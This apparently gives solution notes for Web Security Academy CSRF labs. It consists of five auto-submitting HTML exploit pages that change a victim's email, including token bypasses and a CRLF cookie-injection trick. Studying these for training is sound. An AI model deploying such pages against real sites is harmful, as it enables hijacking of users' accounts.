### CSRF vulnerability with no defenses
```
<html>
  <body>
    <form action="https://ac711fd11f4a145080cf065d007d0000.web-security-academy.net/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
###  token validation depends on request method
```
<html>
  <body>
    <form action="https://ac821f841ea7fc638025526d00e80028.web-security-academy.net/email/change" method="GET">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### CSRF token depends on token being present
```
<html>
  <body>
    <form action="https://ac4a1f6c1e26373580a1293100d10042.web-security-academy.net/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### token is not tied to user session
```
<html>
  <body>
    <form action="https://ac951fd61fbca61f80cd57e100bf002d.web-security-academy.net/email/change" method="POST">
      <!-- Attacker's token -->
      <input required type="hidden" name="csrf" value="nvYjyCnkZg9lxPdk0jUwfsYsM7IGqZP5">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### token is duplicated in cookie
```
<html>
  <body>
    <form action="https://ac251fc31f9c6869805c480f00090062.web-security-academy.net/email/change" method="POST">
      <input required type="hidden" name="csrf" value="myCsrfToken"/>
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <!-- Vulnerability which allows an attacker to inject a cookie to victim. -->
    <img src="https://ac251fc31f9c6869805c480f00090062.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=myCsrfToken" onerror="document.forms[0].submit()">
  </body>
</html>
```
